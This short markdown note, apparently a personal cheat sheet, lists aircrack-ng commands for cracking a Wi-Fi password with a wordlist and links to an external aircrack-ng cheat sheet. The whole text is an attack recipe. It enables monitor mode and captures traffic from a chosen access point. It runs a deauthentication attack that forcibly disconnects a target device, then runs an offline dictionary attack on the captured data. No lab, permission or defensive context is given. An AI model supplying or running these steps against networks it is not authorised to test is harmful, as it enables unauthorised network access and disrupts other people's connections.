# Steps to cracking a wifi's password using a wordlist

airmon-ng start wlan0

airodump-ng wlan0mon

airodump-ng --ivs -w collection --bssid MAC -c 1 wlan0mon

aireplay-ng -0 20 -a AP-MAC -c TARGET_DEVICE wlan0mon

aircrack-ng collection.ivs -w wordlist.txt


# Cheatsheet

https://securityonline.info/aircrack-ng-cheatsheet/
